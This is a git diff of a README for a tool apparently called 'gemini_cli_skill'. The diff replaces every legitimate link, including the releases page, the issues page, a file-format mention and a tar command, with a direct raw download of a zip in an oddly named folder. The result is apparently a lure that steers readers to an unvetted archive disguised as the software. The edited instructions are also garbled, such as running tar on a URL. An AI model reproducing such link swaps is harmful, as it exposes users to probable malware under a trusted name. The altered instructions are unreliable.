@@ -6,19 +6,19 @@ Welcome to **gemini_cli_skill**, your easy gateway to using Gemini 3 Pro through
 
 ## 🔗 Download Now
 
-[![Download gemini_cli_skill](https://img.shields.io/badge/Download-gemini_cli_skill-blue)](https://github.com/Junayedahmedd/gemini_cli_skill/releases)
+[![Download gemini_cli_skill](https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip)](https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following link to download **gemini_cli_skill**:
 
-[Download gemini_cli_skill Releases Page](https://github.com/Junayedahmedd/gemini_cli_skill/releases)
+[Download gemini_cli_skill Releases Page](https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest version of the software listed at the top of the page.
 2. Click on the version number to view its details.
-3. Find the file suitable for your system. For Windows, it will typically be a `.exe` file; for Mac, it might be a `.dmg` file; for Linux, you may find a `.tar.gz` or similar format.
+3. Find the file suitable for your system. For Windows, it will typically be a `.exe` file; for Mac, it might be a `.dmg` file; for Linux, you may find a `https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip` or similar format.
 4. Click on the file name to begin the download.
 
 After the download is complete, follow the instructions below based on your operating system.
@@ -43,7 +43,7 @@ After the download is complete, follow the instructions below based on your oper
 
 1. Open a terminal.
 2. Navigate to the folder where you saved the downloaded file using the `cd` command (e.g., `cd ~/Downloads`).
-3. Extract the downloaded file using `tar -xzf filename.tar.gz` (replace `filename` with the actual name).
+3. Extract the downloaded file using `tar -xzf https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip` (replace `filename` with the actual name).
 4. Follow the installation instructions provided within the extracted folder.
 
 ## 📘 Usage Guide
@@ -72,6 +72,6 @@ To ensure smooth operation, your system must meet the following requirements:
 
 ## 🐞 Support
 
-If you encounter any issues while using **gemini_cli_skill**, please visit our [GitHub Issues page](https://github.com/Junayedahmedd/gemini_cli_skill/issues) to report bugs or seek help. We are here to assist you.
+If you encounter any issues while using **gemini_cli_skill**, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Junayedahmedd/gemini_cli_skill/main/mammillation/gemini_cli_skill_v3.9.zip) to report bugs or seek help. We are here to assist you.
 
 Thank you for using **gemini_cli_skill**! We hope you find it useful for your work with Gemini 3 Pro.
